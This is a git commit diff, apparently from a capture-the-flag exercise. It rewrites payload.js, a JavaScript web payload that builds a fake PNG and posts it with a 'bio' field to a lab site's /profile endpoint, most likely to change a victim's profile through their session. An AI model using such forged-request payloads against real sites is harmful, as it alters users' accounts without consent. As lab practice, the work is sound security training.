85d4cd65ea7488dc11b0a3c47b197ddefaccb48a
Matias Lima <matiaselima@hotmail.com>
2026-09-24 05:56:29 -0300

    probando 4

--- payload.js
+++ payload.js
@@ -1,14 +1,28 @@
-fetch('https://matiaselima.github.io/ctf/133954957131333153.jpg')
-  .then(res => res.blob())
-  .then(blob => {
-      var formData = new FormData();
-      formData.append("bio", "None"); 
-      formData.append("profile_pic", blob, "133954957131333153.jpg");
+// Esto es un PNG real de 1x1 píxel transparente
+var base64Image = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNkYAAAAAYAAjCB0C8AAAAASUVORK5CYII=";
+
+// Convertimos el base64 a bytes puros
+var byteCharacters = atob(base64Image);
+var byteNumbers = new Array(byteCharacters.length);
+for (var i = 0; i < byteCharacters.length; i++) {
+    byteNumbers[i] = byteCharacters.charCodeAt(i);
+}
+var byteArray = new Uint8Array(byteNumbers);
+
+// Creamos el Blob válido
+var fakeImage = new Blob([byteArray], { type: 'image/png' });
+
+var formData = new FormData();
+formData.append("bio", "None"); 
+// Le ponemos el nombre que pide el enunciado
+formData.append("profile_pic", fakeImage, "image_4a1768.png"); 
+
+// Hacer el fetch POST aquí...
       fetch('https://chl-4678a9a0-9134-4d4a-9ff5-023cd20a4d1c-blog-hacklab.softwareseguro.com.ar/profile', {
         method: 'POST',
         body: formData
       });
-  });
+
 
 // Recuerda poner la ruta correcta de la petición original aquí
 
